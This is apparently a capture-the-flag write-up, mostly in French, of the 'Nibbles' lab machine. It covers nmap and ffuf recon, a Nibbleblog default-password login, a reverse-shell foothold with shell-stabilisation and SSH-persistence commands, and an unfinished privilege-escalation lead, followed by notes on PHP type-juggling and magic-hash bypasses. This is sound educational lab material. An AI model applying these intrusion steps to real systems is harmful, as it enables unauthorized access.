\chapter{Nibbles}
\begin{itemize}
    \item {\bf technics}: PHP Juggling type 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}

\begin{verbatim}
 sudo nmap -sVC -p22,80 10.10.10.75
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 05:14 CET
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 05:14 (0:00:06 remaining)
Nmap scan report for 10.10.10.75
Host is up (0.029s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}

\subsubsection{http}

sources renvoie vers \verb+/nibbleblog/+

techno: \verb+php, jquery 2.1.0+

\verb+http://10.10.10.75/nibbleblog/feed.php+ renvoie un xml.

\verb+http://10.10.10.75/nibbleblog/index.php?controller=blog&action=view&category=videos+i

\begin{verbatim}
$ ffuf -u http://10.10.10.75/nibbleblog/FUZZ 
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -e .php

.htaccess               [Status: 403, Size: 306, Words: 22, Lines: 12, Duration: 26ms]
.hta.php                [Status: 403, Size: 305, Words: 22, Lines: 12, Duration: 27ms]
.hta                    [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 27ms]
.htaccess.php           [Status: 403, Size: 310, Words: 22, Lines: 12, Duration: 52ms]
.htpasswd               [Status: 403, Size: 306, Words: 22, Lines: 12, Duration: 31ms]
.htpasswd.php           [Status: 403, Size: 310, Words: 22, Lines: 12, Duration: 49ms]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 35ms]
admin                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 27ms]
admin.php               [Status: 200, Size: 1401, Words: 79, Lines: 27, Duration: 51ms]
admin.php               [Status: 200, Size: 1401, Words: 79, Lines: 27, Duration: 48ms]
content                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 38ms]
feed.php                [Status: 200, Size: 302, Words: 8, Lines: 8, Duration: 45ms]
index.php               [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 56ms]
index.php               [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 62ms]
install.php             [Status: 200, Size: 78, Words: 11, Lines: 1, Duration: 35ms]
languages               [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 26ms]
plugins                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 25ms]
sitemap.php             [Status: 200, Size: 402, Words: 33, Lines: 11, Duration: 51ms]
themes                  [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 27ms]
update.php              [Status: 200, Size: 1622, Words: 103, Lines: 88, Duration: 49ms]

\end{verbatim}

\begin{verbatim}
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
\end{verbatim}

\begin{verbatim}
$ searchsploit nibbleblog

Nibbleblog 3 - Multiple SQL Injections                  | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)   | php/remote/38489.rb
\end{verbatim}

\url{https://github.com/dignajar/nibbleblog}

\begin{verbatim}
nibbleblog/admin/controllers/user/login.bit: 

i   $safe = array();
	$safe['username'] = Validation::sanitize_html($_POST['username']);
	$safe['password'] = Validation::sanitize_html($_POST['password']);

	$Login->verify_login( array('username'=>$safe['username'], 'password'=>$safe['password']) );
\end{verbatim}

\begin{verbatim}

fix magic hash authentication bypass #148

The loose comparison allows attackers to authenticate without a correct password.
For example, if the hash value from sha1 starts with 0e and forms a magic hash, 
it can be easily bypassed.

-- Reference to magic hash

admin/kernel/api/login.class.php

-            if($args['username']==$_USER[0]['username'])
+			if($args['username']===$_USER[0]['username'])

-				if($hash==$_USER[0]['password'])
+				if($hash===$_USER[0]['password'])
\end{verbatim}

\url{https://salmonsec.com/cheatsheet/type_juggeling}

dans le code la fonction de hash du password est \verb+sha1+

donc normalement le magic hash est :
\begin{verbatim}
0e07766915004133176347055865026311692244
\end{verbatim}

le problème c'est que la fonction de sha1 prend un salt donc cela va poser des
soucis.

\begin{verbatim}
http://10.10.10.75/nibbleblog/content/
http://10.10.10.75/nibbleblog/content/private/users.xml

<users>
    <user username="admin">
        <id type="integer">0</id>
        <session_fail_count type="integer">3</session_fail_count>
        <session_date type="integer">1667194156</session_date>
    </user>
    <blAcklist type="string" ip="10.10.10.1">
        <date type="integer">1512964659</date>
        <fail_count type="integer">1</fail_count>
    </blacklist>
    <blacklist type="string" ip="10.10.16.5">
        <date type="integer">1667194156</date>
        <fail_count type="integer">1</fail_count>
    </blacklist>
</users>
\end{verbatim}

et si on essaie des default password: \verb+nibbles+ fonctionne


\subsection{Foothold}
\subsubsection{nibbler}
on utilise \url{https://www.revshells.com/} avec \verb+PHP Ivan Sincek+
\begin{verbatim}
python3 -c 'import pty; pty.spawn("/bin/bash")'
(inside the nc session) CTRL+Z
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 1

nibbler@Nibbles:/home$ id
id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
$ ssh-keygen
nibbler@Nibbles:/home/nibbler/.ssh$ cp id_rsa.pub authorized_keys
\end{verbatim}

\begin{verbatim}
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
\end{verbatim}

\begin{verbatim}

\end{verbatim}
\section{Theorie}

\subsection{PHP Juggling type and magic hashes}

PHP provides two ways to compare two variables:
\begin{itemize}
    \item Loose comparison using \verb+==+ or \verb+!=+ : both variables have
        “the same value”.
    \item Strict comparison using \verb+===+ or \verb+!==+ : both variables
        have “the same type and the same value”.
\end{itemize}

PHP type juggling vulnerabilities arise when loose comparison is employed
instead of strict comparison in an area where the attacker can control one of
the variables being compared. This vulnerability can result in the application
returning an unintended answer to the true or false statement, and can lead to
severe authorization and/or authentication bugs.

PHP8 won’t try to cast string into numbers anymore, thanks to the Saner string
to number comparisons RFC, meaning that collision with hashes starting with 0e
and the likes are finally a thing of the past! 

The Consistent type errors for internal functions RFC will prevent things like
\verb+0 == strcmp($_GET['username'], $password)+ bypasses, since strcmp won’t
return null and spit a warning any longer, but will throw a proper exception
instead.

\begin{verbatim}
It gets weirder... If PHP decides that both operands look like
numbers, even if they are actually strings, it will convert them
both and perform a numeric comparison:
 TRUE: "0e12345" == "0e54321"
 TRUE: "0e12345" <= "1"
 TRUE: "0e12345" == "0"
 TRUE: "0xF" == "15"
\end{verbatim}
